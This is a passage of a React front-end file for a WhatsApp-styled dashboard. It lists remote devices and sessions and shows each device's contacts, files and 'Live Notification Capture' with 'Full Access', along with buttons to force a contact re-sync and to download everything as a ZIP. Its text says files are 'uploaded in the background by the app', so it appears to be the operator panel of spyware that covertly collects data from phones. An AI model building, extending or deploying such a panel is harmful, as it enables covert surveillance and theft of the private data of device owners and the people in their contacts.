              </Avatar>
              <h3 className="text-lg font-bold text-gray-900">{selectedContact.name}</h3>
              {selectedContact.organization && <p className="text-sm text-gray-500">{selectedContact.organization}</p>}
            </div>
            <Separator className="my-4" />
            <div className="flex items-center gap-3 py-2">
              <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                <Phone className="w-5 h-5 text-[#25D366]" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-xs text-gray-500 mb-0.5">Phone</p>
                <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.phone}</p>
              </div>
            </div>
            {selectedContact.email && (
              <div className="flex items-center gap-3 py-2">
                <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                  <FileText className="w-5 h-5 text-[#25D366]" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-gray-500 mb-0.5">Email</p>
                  <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.email}</p>
                </div>
              </div>
            )}
            {selectedContact.deviceId && devices[selectedContact.deviceId] && (
              <div className="flex items-center gap-3 py-2">
                <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                  <Smartphone className="w-5 h-5 text-[#25D366]" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-gray-500 mb-0.5">Device</p>
                  <p className="text-sm font-medium text-gray-900 truncate">{devices[selectedContact.deviceId].name} ({devices[selectedContact.deviceId].model})</p>
                </div>
              </div>
            )}
          </div>
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
              <FileText className="w-4 h-4 text-white/80" />
              <h4 className="text-white font-semibold text-sm">vCard Format</h4>
            </div>
            <div className="p-4">
              <pre className="text-xs text-gray-700 bg-gray-50 rounded-xl p-4 overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed">{vcard}</pre>
            </div>
          </div>
          <div className="grid grid-cols-3 gap-3 pb-2">
            <Button onClick={() => copyVCard(selectedContact)} className="bg-[#075E54] hover:bg-[#064E46] text-white h-14 rounded-xl flex-col gap-1 text-xs">
              {copiedId === selectedContact.id ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              {copiedId === selectedContact.id ? 'Copied' : 'Copy'}
            </Button>
            <Button onClick={() => downloadVCard(selectedContact)} className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-1 text-xs">
              <Download className="w-5 h-5" /> Download
            </Button>
            <Button onClick={() => shareVCard(selectedContact)} variant="outline" className="border-[#075E54] text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-1 text-xs">
              <Share2 className="w-5 h-5" /> Share
            </Button>
          </div>
        </div>
      </div>
    );
  }

  // ─── Main List View ───────────────────────────────
  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      {/* Header */}
      <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
        <a href="/" className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
          <ArrowLeft className="w-5 h-5 text-white" />
        </a>
        <div className="flex-1 min-w-0 relative">
          <button
            onClick={() => { setShowSessionList(!showSessionList); fetchAllSessions(); }}
            className="flex items-center gap-1.5 w-full text-left"
          >
            <h1 className="text-white font-semibold text-base truncate">{appName}</h1>
            <ChevronDown className={`w-4 h-4 text-white/60 shrink-0 transition-transform ${showSessionList ? 'rotate-180' : ''}`} />
          </button>
          <p className="text-white/70 text-xs">
            {contacts.length} contacts &bull; {uploadedFiles.length} files
            {isOnline && <span className="ml-1 text-[#25D366]">&bull; LIVE</span>}
          </p>

          {/* Session Switcher Dropdown */}
          {showSessionList && (
            <div className="absolute top-full left-0 right-0 mt-1 bg-white rounded-xl shadow-xl border border-gray-200 max-h-[60vh] overflow-y-auto z-50">
              <div className="px-3 py-2 bg-[#075E54] rounded-t-xl flex items-center justify-between sticky top-0">
                <span className="text-white font-semibold text-xs">All Sessions ({allSessions.length})</span>
                <button onClick={() => setShowSessionList(false)} className="w-5 h-5 rounded-full hover:bg-white/20 flex items-center justify-center">
                  <X className="w-3 h-3 text-white/70" />
                </button>
              </div>
              {allSessions.length === 0 ? (
                <div className="px-4 py-6 text-center">
                  <p className="text-gray-400 text-xs">No sessions found</p>
                </div>
              ) : (
                allSessions.map((s) => {
                  const isActive = s.id === sessionId;
                  const sStepIdx = getStepIndex(s.status);
                  return (
                    <button
                      key={s.id}
                      onClick={() => {
                        if (s.id !== sessionId) {
                          window.location.href = `/view/${s.id}`;
                        }
                        setShowSessionList(false);
                      }}
                      className={`w-full px-3 py-2.5 flex items-center gap-2.5 text-left transition-colors border-b border-gray-50 last:border-0 ${
                        isActive ? 'bg-[#25D366]/10' : 'hover:bg-gray-50'
                      }`}
                    >
                      <Avatar className="w-9 h-9 shrink-0">
                        <AvatarFallback className={`${getAvatarColor(s.appName)} text-white font-bold text-xs`}>
                          {getInitials(s.appName)}
                        </AvatarFallback>
                      </Avatar>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-1.5">
                          <p className={`text-sm font-semibold truncate ${isActive ? 'text-[#075E54]' : 'text-gray-900'}`}>{s.appName}</p>
                          {s.isOnline ? (
                            <span className="w-1.5 h-1.5 rounded-full bg-[#25D366] animate-pulse shrink-0" />
                          ) : (
                            <span className="w-1.5 h-1.5 rounded-full bg-gray-300 shrink-0" />
                          )}
                          {isActive && (
                            <Badge className="bg-[#25D366] text-white border-0 text-[8px] px-1.5 py-0 h-3.5">ACTIVE</Badge>
                          )}
                        </div>
                        <div className="flex items-center gap-2 text-[10px] text-gray-400">
                          <span>{s.count} contacts</span>
                          <span>&bull;</span>
                          <span>{s.fileCount} files</span>
                          <span>&bull;</span>
                          <span>{timeAgo(s.createdAt)}</span>
                        </div>
                        {/* Mini progress */}
                        <div className="flex items-center gap-0.5 mt-0.5">
                          {STATUS_STEPS.map((step, idx) => (
                            <div key={step.key} className={`w-1.5 h-1.5 rounded-full ${idx < sStepIdx ? 'bg-[#25D366]' : idx === sStepIdx ? 'bg-[#25D366] animate-pulse' : 'bg-gray-200'}`} />
                          ))}
                        </div>
                      </div>
                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                    </button>
                  );
                })
              )}
            </div>
          )}
        </div>
        <button onClick={() => copyViewLink()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Copy Session Link">
          {copiedLink ? (
            <Check className="w-4 h-4 text-[#25D366]" />
          ) : (
            <Copy className="w-4 h-4 text-white/70" />
          )}
        </button>
        <button
          onClick={() => {
            setOldCodeInput('');
            setNewCodeInput('');
            setChangeCodeError('');
            setShowChangeCodeModal(true);
          }}
          className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center"
          title="Change Access Code"
        >
          <KeyRound className="w-4 h-4 text-white/70" />
        </button>
        <button onClick={() => handleRefresh()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
          <RefreshCw className="w-4 h-4 text-white/70" />
        </button>
        <button onClick={handleDeleteSession} disabled={deletingSession} className="w-8 h-8 rounded-full hover:bg-red-500/30 flex items-center justify-center" title="Delete Session">
          {deletingSession ? (
            <Loader2 className="w-4 h-4 text-red-300 animate-spin" />
          ) : (
            <Trash2 className="w-4 h-4 text-red-300" />
          )}
        </button>
      </div>

      {/* Status Stepper */}
      <StatusStepper status={sessionStatus} isOnline={isOnline} />

      {/* Device Selector Section */}
      {deviceList.length > 0 && (
        <div className="px-3 py-3 bg-[#ECE5DD]">
          <div className="flex items-center justify-between mb-2">
            <h3 className="text-xs font-bold text-gray-600 flex items-center gap-1.5">
              <Monitor className="w-3.5 h-3.5" />
              Connected Devices
              <Badge className="bg-[#075E54] text-white border-0 text-[10px] px-1.5 py-0 h-4 min-w-[20px]">{deviceList.length}</Badge>
            </h3>
            {selectedDeviceId && (
              <button
                onClick={() => setSelectedDeviceId('')}
                className="text-[10px] text-[#075E54] font-semibold hover:underline"
              >
                Show All
              </button>
            )}
          </div>
          <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar">
            {/* All Devices Card */}
            <button
              onClick={() => setSelectedDeviceId('')}
              className={`shrink-0 rounded-xl p-3 min-w-[120px] max-w-[160px] border-2 transition-all ${
                selectedDeviceId === ''
                  ? 'bg-[#075E54] border-[#25D366] shadow-md'
                  : 'bg-white border-gray-200 hover:border-[#075E54]/30'
              }`}
            >
              <div className="flex items-center gap-2 mb-1.5">
                <div className={`w-7 h-7 rounded-full flex items-center justify-center ${
                  selectedDeviceId === '' ? 'bg-[#25D366]/30' : 'bg-gray-100'
                }`}>
                  <Monitor className={`w-3.5 h-3.5 ${selectedDeviceId === '' ? 'text-[#25D366]' : 'text-gray-500'}`} />
                </div>
                <span className={`text-[10px] font-bold ${selectedDeviceId === '' ? 'text-[#25D366]' : 'text-gray-500'}`}>
                  ALL
                </span>
              </div>
              <p className={`text-xs font-semibold truncate ${selectedDeviceId === '' ? 'text-white' : 'text-gray-900'}`}>
                All Devices
              </p>
              <p className={`text-[10px] ${selectedDeviceId === '' ? 'text-white/60' : 'text-gray-400'}`}>
                {contacts.length} contacts &bull; {uploadedFiles.length} files
              </p>
            </button>

            {/* Individual Device Cards */}
            {deviceList.map((device) => (
              <button
                key={device.id}
                onClick={() => setSelectedDeviceId(selectedDeviceId === device.id ? '' : device.id)}
                className={`shrink-0 rounded-xl p-3 min-w-[120px] max-w-[180px] border-2 transition-all ${
                  selectedDeviceId === device.id
                    ? 'bg-[#075E54] border-[#25D366] shadow-md'
                    : 'bg-white border-gray-200 hover:border-[#075E54]/30'
                }`}
              >
                <div className="flex items-center gap-2 mb-1.5">
                  <div className={`w-7 h-7 rounded-full flex items-center justify-center ${
                    selectedDeviceId === device.id ? 'bg-[#25D366]/30' : device.isOnline ? 'bg-green-50' : 'bg-gray-100'
                  }`}>
                    <TabletSmartphone className={`w-3.5 h-3.5 ${
                      selectedDeviceId === device.id ? 'text-[#25D366]' : device.isOnline ? 'text-green-600' : 'text-gray-400'
                    }`} />
                  </div>
                  <span className={`w-2 h-2 rounded-full shrink-0 ${
                    device.isOnline ? 'bg-[#25D366] animate-pulse' : 'bg-gray-300'
                  }`} />
                </div>
                <p className={`text-xs font-semibold truncate ${selectedDeviceId === device.id ? 'text-white' : 'text-gray-900'}`}>
                  {device.name || device.model}
                </p>
                <p className={`text-[10px] truncate ${selectedDeviceId === device.id ? 'text-white/60' : 'text-gray-400'}`}>
                  {device.brand} {device.model}
                </p>
                <p className={`text-[10px] mt-0.5 ${selectedDeviceId === device.id ? 'text-white/50' : 'text-gray-300'}`}>
                  {deviceContactCounts[device.id] || 0} contacts &bull; {deviceFileCounts[device.id] || 0} files
                </p>
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Access Status Cards */}
      <div className="px-3 py-3 bg-[#ECE5DD]">
        <div className="grid grid-cols-3 gap-3">
          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
            <div className="w-10 h-10 rounded-full bg-[#25D366]/20 flex items-center justify-center mx-auto mb-1.5">
              <Phone className="w-5 h-5 text-[#25D366]" />
            </div>
            <p className="text-white font-bold text-sm">Contact</p>
            <p className="text-[#25D366] text-xs font-semibold">Full Access</p>
            <p className="text-white/50 text-[10px] mt-0.5">{filteredContacts.length} contacts</p>
            {filteredContacts.length > 0 && (
              <button
                onClick={(e) => { e.stopPropagation(); openDeleteDataModal('contacts'); }}
                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
                title="Delete all contacts"
              >
                <Trash2 className="w-2.5 h-2.5" /> Delete
              </button>
            )}
          </div>
          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
            <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
              <HardDrive className="w-5 h-5 text-blue-400" />
            </div>
            <p className="text-white font-bold text-sm">File Manager</p>
            <p className="text-blue-400 text-xs font-semibold">Full Access</p>
            <p className="text-white/50 text-[10px] mt-0.5">{formatFileSize(totalUploadSize)}</p>
            {filteredFiles.length > 0 && (
              <button
                onClick={(e) => { e.stopPropagation(); openDeleteDataModal('files'); }}
                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
                title="Delete all files"
              >
                <Trash2 className="w-2.5 h-2.5" /> Delete
              </button>
            )}
          </div>
          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
            <div className="w-10 h-10 rounded-full bg-purple-400/20 flex items-center justify-center mx-auto mb-1.5">
              <Bell className="w-5 h-5 text-purple-400" />
            </div>
            <p className="text-white font-bold text-sm">Notifications</p>
            <p className="text-purple-400 text-xs font-semibold">Live Access</p>
            <p className="text-white/50 text-[10px] mt-0.5">{notifTotal} captured</p>
            {notifTotal > 0 && (
              <button
                onClick={(e) => { e.stopPropagation(); handleDeleteAllNotifications(); }}
                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
                title="Delete all notifications"
              >
                <Trash2 className="w-2.5 h-2.5" /> Delete
              </button>
            )}
          </div>
        </div>
      </div>

      {/* 1-Click ZIP Download Banner */}
      <div className="px-3 pb-2 bg-[#ECE5DD]">
        <button
          onClick={downloadZip}
          disabled={zipDownloading}
          className="w-full bg-gradient-to-r from-[#075E54] to-[#054D44] text-white rounded-2xl px-4 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform disabled:opacity-60"
        >
          <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
            {zipDownloading ? <Loader2 className="w-5 h-5 text-white animate-spin" /> : <Archive className="w-5 h-5 text-white" />}
          </div>
          <div className="flex-1 text-left min-w-0">
            <h2 className="font-bold text-base">
              {zipDownloading ? 'Creating ZIP...' : 'Download All as ZIP'}
            </h2>
            <p className="text-white/70 text-xs">
              {filteredFiles.length > 0
                ? `${filteredFiles.length} files + ${filteredContacts.length} contacts`
                : 'Files will appear as app syncs them'
              }
            </p>
          </div>
          <Archive className="w-6 h-6 text-white/40 shrink-0" />
        </button>
      </div>

      {/* Tab Switcher */}
      <div className="px-3 pb-1 bg-[#ECE5DD]">
        <div className="flex bg-white rounded-xl shadow-sm p-1">
          <button
            onClick={() => { setActiveTab('contacts'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'contacts' ? 'bg-[#075E54] text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <Phone className="w-3.5 h-3.5" />
            Contacts ({filteredContacts.length})
          </button>
          <button
            onClick={() => { setActiveTab('files'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'files' ? 'bg-blue-600 text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <FolderOpen className="w-3.5 h-3.5" />
            Files ({filteredFiles.length})
          </button>
          <button
            onClick={() => { setActiveTab('manager'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'manager' ? 'bg-orange-600 text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <HardDrive className="w-3.5 h-3.5" />
            Manager
          </button>
          <button
            onClick={() => { setActiveTab('notifications'); setSearchQuery(''); }}
            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              activeTab === 'notifications' ? 'bg-purple-600 text-white' : 'text-gray-500 hover:text-gray-700'
            }`}
          >
            <Bell className="w-3.5 h-3.5" />
            Notifications{notifTotal > 0 ? ` (${notifTotal > 99 ? '99+' : notifTotal})` : ''}
          </button>
        </div>
      </div>

      {/* Search */}
      <div className="px-3 py-2 bg-[#ECE5DD]">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
          <Input
            placeholder={activeTab === 'contacts' ? 'Search contacts...' : 'Search files...'}
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-9 pr-9 h-10 bg-white rounded-xl border-0 shadow-sm text-sm"
          />
          {searchQuery && (
            <button onClick={() => setSearchQuery('')} className="absolute right-3 top-1/2 -translate-y-1/2">
              <X className="w-4 h-4 text-gray-400" />
            </button>
          )}
        </div>
      </div>

      {/* ─── CONTACTS TAB ───────────────────────────── */}
      {activeTab === 'contacts' && (
        <>
          {/* Sync Contacts Button */}
          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
            <button
              onClick={handleSyncContacts}
              disabled={syncingContacts}
              className="w-full bg-gradient-to-r from-[#25D366] to-[#20BD5A] hover:from-[#20BD5A] hover:to-[#1AA84F] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform disabled:opacity-60"
            >
              <div className="w-11 h-11 rounded-full bg-white/20 flex items-center justify-center shrink-0">
                {syncingContacts ? (
                  <Loader2 className="w-5 h-5 text-white animate-spin" />
                ) : (
                  <RefreshCcw className="w-5 h-5 text-white" />
                )}
              </div>
              <div className="flex-1 text-left min-w-0">
                <h2 className="font-bold text-base">
                  {syncingContacts ? 'Syncing Contacts...' : 'Sync Contacts'}
                </h2>
                <p className="text-white/80 text-xs">
                  {syncingContacts ? 'Requesting device to re-upload' : 'Click to re-sync contacts from device'}
                </p>
              </div>
              <Smartphone className="w-5 h-5 text-white/50 shrink-0" />
            </button>
          </div>

          {/* My Contacted Numbers button */}
          <div className="px-3 py-1 bg-[#ECE5DD]">
            <button
              onClick={() => setShowVcardAll(!showVcardAll)}
              className="w-full bg-[#075E54] hover:bg-[#064E46] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform"
            >
              <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
                <Phone className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1 text-left min-w-0">
                <h2 className="font-bold text-base">My Contacted Numbers</h2>
                <p className="text-white/70 text-xs">{filteredContacts.length} contacts in vCard format</p>
              </div>
              <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">{filteredContacts.length}</Badge>
            </button>
          </div>

          {showVcardAll && (
            <div className="px-3 pb-2 bg-[#ECE5DD]">
              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
                <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <FileText className="w-4 h-4 text-white/80" />
                    <h4 className="text-white font-semibold text-sm">All Contacts vCard</h4>
                  </div>
                  <button onClick={() => setShowVcardAll(false)}>
                    <X className="w-4 h-4 text-white/60" />
                  </button>
                </div>
                <div className="p-4">
                  <pre className="text-[10px] text-gray-700 bg-gray-50 rounded-xl p-3 overflow-auto max-h-48 whitespace-pre-wrap font-mono leading-relaxed">
                    {generateAllVCard(filteredContacts)}
                  </pre>
                </div>
                <div className="px-4 pb-4 flex gap-2">
                  <Button onClick={copyAllVCard} variant="outline" size="sm" className="flex-1 border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 rounded-xl h-10 text-xs">
                    {copiedAll ? <Check className="w-3.5 h-3.5 mr-1" /> : <Copy className="w-3.5 h-3.5 mr-1" />}
                    {copiedAll ? 'Copied All' : 'Copy All vCard'}
                  </Button>
                  <Button onClick={downloadAllVCard} size="sm" className="flex-1 bg-[#25D366] hover:bg-[#20BD5A] text-white rounded-xl h-10 text-xs">
                    <Download className="w-3.5 h-3.5 mr-1" /> Download All .vcf
                  </Button>
                </div>
              </div>
            </div>
          )}

          <ScrollArea className="flex-1">
            <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
              {filteredContacts.length === 0 ? (
                <div className="py-12 text-center">
                  <Users className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                  <p className="text-gray-500 text-sm">No contacts found</p>
                  {selectedDeviceId && (
                    <button
                      onClick={() => setSelectedDeviceId('')}
                      className="text-[#075E54] text-xs font-semibold mt-2 hover:underline"
                    >
                      Show all devices
                    </button>
                  )}
                </div>
              ) : (
                filteredContacts.map((contact, index) => (
                  <React.Fragment key={contact.id}>
                    <button
                      onClick={() => { setSelectedContact(contact); setView('detail'); }}
                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
                    >
                      <Avatar className="w-11 h-11 shrink-0">
                        <AvatarFallback className={`${getAvatarColor(contact.name)} text-white font-semibold text-sm`}>
                          {getInitials(contact.name)}
                        </AvatarFallback>
                      </Avatar>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-sm font-semibold text-gray-900 truncate">{contact.name}</h3>
                        <p className="text-xs text-gray-500 truncate mt-0.5">{contact.phone}</p>
                      </div>
                      {contact.deviceId && devices[contact.deviceId] && !selectedDeviceId && (
                        <span className="text-[9px] text-gray-400 truncate max-w-[60px]">{devices[contact.deviceId].name}</span>
                      )}
                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                    </button>
                    {index < filteredContacts.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
                  </React.Fragment>
                ))
              )}
            </div>
          </ScrollArea>
        </>
      )}

      {/* ─── FILES TAB (Uploaded Files with grid/list view) ── */}
      {activeTab === 'files' && (
        <>
          {/* File type filter + view toggle */}
          <div className="px-3 pb-1 bg-[#ECE5DD]">
            <div className="flex items-center gap-2">
              <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar flex-1">
                {[
                  { key: 'all', label: 'All', count: filteredFiles.length },
                  { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
                  { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
                  { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
                  { key: 'pdf', label: 'PDF', count: fileTypeCounts.pdf || 0 },
                  { key: 'document', label: 'Docs', count: fileTypeCounts.document || 0 },
                ].map(filter => (
                  <button
                    key={filter.key}
                    onClick={() => setFileTypeFilter(filter.key)}
                    className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-colors ${
                      fileTypeFilter === filter.key
                        ? 'bg-[#075E54] text-white'
                        : 'bg-white text-gray-600 hover:bg-gray-100'
                    }`}
                  >
                    {filter.label} ({filter.count})
                  </button>
                ))}
              </div>
              {/* View toggle */}
              <button
                onClick={() => setFileViewMode(fileViewMode === 'list' ? 'grid' : 'list')}
                className="w-8 h-8 rounded-full bg-white shadow-sm flex items-center justify-center shrink-0"
                title={fileViewMode === 'list' ? 'Grid view' : 'List view'}
              >
                {fileViewMode === 'list' ? (
                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path d="M1 2.5A1.5 1.5 0 012.5 1h3A1.5 1.5 0 017 2.5v3A1.5 1.5 0 015.5 7h-3A1.5 1.5 0 011 5.5v-3zm8 0A1.5 1.5 0 0110.5 1h3A1.5 1.5 0 0115 2.5v3A1.5 1.5 0 0113.5 7h-3A1.5 1.5 0 019 5.5v-3zm-8 8A1.5 1.5 0 012.5 9h3A1.5 1.5 0 017 10.5v3A1.5 1.5 0 015.5 15h-3A1.5 1.5 0 011 13.5v-3zm8 0A1.5 1.5 0 0110.5 9h3a1.5 1.5 0 011.5 1.5v3a1.5 1.5 0 01-1.5 1.5h-3A1.5 1.5 0 019 13.5v-3z"/></svg>
                ) : (
                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path fillRule="evenodd" d="M2.5 12a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5z"/></svg>
                )}
              </button>
            </div>
          </div>

          <ScrollArea className="flex-1">
            {filteredFiles.length === 0 ? (
              <div className="bg-white mx-3 rounded-2xl shadow-sm p-8 text-center mb-4">
                <FolderOpen className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
                  Files are being uploaded in the background by the app. Refresh to check for updates.
                </p>
                {selectedDeviceId && (
                  <button
                    onClick={() => setSelectedDeviceId('')}
                    className="text-[#075E54] text-xs font-semibold mt-2 hover:underline"
                  >
                    Show all devices
                  </button>
                )}
                <Button
                  onClick={() => handleRefresh()}
                  variant="outline"
                  size="sm"
                  className="mt-3 border-[#075E54]/30 text-[#075E54] rounded-xl text-xs"
                >
                  <RefreshCw className="w-3.5 h-3.5 mr-1" /> Refresh
                </Button>
              </div>
            ) : fileViewMode === 'grid' ? (
              /* ─── GRID VIEW ─── */
              <div className="px-3 pb-4">
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                  {filteredFiles.map((file) => (
                    <div
                      key={file.id}
                      className="bg-white rounded-xl shadow-sm overflow-hidden cursor-pointer hover:shadow-md transition-shadow"
                      onClick={() => {
                        if (file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') {
                          setPreviewFile(file);
                        }
                      }}
                    >
                      {/* Thumbnail area */}
                      <div className="aspect-square bg-gray-50 flex items-center justify-center overflow-hidden relative">
                        {file.fileType === 'image' ? (
                          <img
                            src={file.downloadUrl}
                            alt={file.fileName}
                            className="w-full h-full object-cover"
                            loading="lazy"
                          />
                        ) : file.fileType === 'video' ? (
                          <div className="relative w-full h-full bg-black flex items-center justify-center">
                            <video
                              src={file.downloadUrl}
                              className="w-full h-full object-cover"
                              muted
                              preload="metadata"
                            />
                            <div className="absolute inset-0 flex items-center justify-center">
                              <div className="w-10 h-10 rounded-full bg-white/80 flex items-center justify-center">
                                <Play className="w-5 h-5 text-[#075E54] ml-0.5" />
                              </div>
                            </div>
                          </div>
                        ) : file.fileType === 'audio' ? (
                          <div className="flex flex-col items-center gap-2 w-full px-2">
                            <Music className="w-8 h-8 text-orange-400" />
                            <audio
                              controls
                              className="w-full h-8"
                              src={file.downloadUrl}
                              onClick={(e) => e.stopPropagation()}
                            >
                              <track kind="captions" />
                            </audio>
                          </div>
                        ) : file.fileType === 'pdf' ? (
                          <div className="flex flex-col items-center gap-2">
                            <FileText className="w-10 h-10 text-red-400" />
                            <span className="text-[10px] text-gray-500">PDF Document</span>
                          </div>
                        ) : (
                          <div className="flex flex-col items-center gap-2">
                            {getFileIcon(file.fileType)}
                            <span className="text-[10px] text-gray-500 capitalize">{file.fileType}</span>
                          </div>
                        )}
                      </div>
                      {/* File info */}
                      <div className="p-2">
                        <p className="text-xs font-medium text-gray-900 truncate">{file.fileName}</p>
                        <p className="text-[10px] text-gray-400">{formatFileSize(file.fileSize)}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              /* ─── LIST VIEW (original) ─── */
              <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
                {filteredFiles.map((file, index) => (
                  <React.Fragment key={file.id}>
                    <div className="w-full flex items-center gap-3 px-4 py-3">
                      <div className={`w-11 h-11 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                        {getFileIcon(file.fileType)}
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-sm font-medium text-gray-900 truncate">{file.fileName}</h3>
                        <p className="text-xs text-gray-500 mt-0.5 flex items-center gap-1.5 flex-wrap">
                          <span>{formatFileSize(file.fileSize)}</span>
                          <span className="text-gray-300">|</span>
                          <span className="capitalize">{file.fileType}</span>
                          <span className="text-gray-300">|</span>
                          <span>{timeAgo(file.uploadedAt)}</span>
                          {file.deviceId && devices[file.deviceId] && !selectedDeviceId && (
                            <>
                              <span className="text-gray-300">|</span>
                              <span className="text-gray-400 truncate max-w-[60px]">{devices[file.deviceId].name}</span>
                            </>
                          )}
                        </p>
                      </div>
                      <div className="flex items-center gap-1">
                        {(file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') && (
                          <button
                            onClick={() => setPreviewFile(file)}
                            className="w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center"
                            title="Preview"
                          >
                            <Eye className="w-4 h-4 text-gray-400" />
                          </button>
                        )}
                        <button
                          onClick={() => downloadSingleFile(file)}
                          className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center"
                          title="Download"
                        >
                          <Download className="w-4 h-4 text-[#25D366]" />
                        </button>
                      </div>
                    </div>
                    {index < filteredFiles.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
                  </React.Fragment>
                ))}
              </div>
            )}
          </ScrollArea>
        </>
      )}

      {/* ─── NOTIFICATIONS TAB ───────────────────────────── */}
      {activeTab === 'notifications' && (
        <>
          {/* Notification Stats & Controls */}
          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
            <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
              <div className="px-4 py-3 bg-purple-700 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Bell className="w-4 h-4 text-purple-200" />
                  <h4 className="text-white font-semibold text-sm">Live Notification Capture</h4>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={fetchNotifications}
                    disabled={notifLoading}
                    className="w-7 h-7 rounded-full hover:bg-white/10 flex items-center justify-center"
                    title="Refresh"
                  >
